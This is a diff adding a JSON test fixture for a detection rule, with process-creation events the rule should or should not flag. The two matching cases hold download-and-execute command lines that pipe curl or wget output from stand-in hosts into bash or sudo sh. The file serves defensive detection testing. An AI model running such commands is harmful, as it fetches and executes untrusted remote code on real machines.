@@ -1,0 +1,46 @@
+{
+  "should_match": [
+    {
+      "description": "curl piped to bash",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "www-data",
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 'curl -fsSL http://198.51.100.7/x.sh | bash'"
+      }
+    },
+    {
+      "description": "wget piped to sudo sh",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "ubuntu",
+        "Image": "/usr/bin/sh",
+        "CommandLine": "sh -c 'wget -qO- https://evil.example/m | sudo sh'"
+      }
+    }
+  ],
+  "should_not_match": [
+    {
+      "description": "curl saved to a file",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "deploy",
+        "Image": "/usr/bin/curl",
+        "CommandLine": "curl -o /tmp/report.json https://api.example.com/report"
+      }
+    },
+    {
+      "description": "curl piped to jq",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "deploy",
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 'curl -s https://api.example.com | jq .status'"
+      }
+    }
+  ]
+}
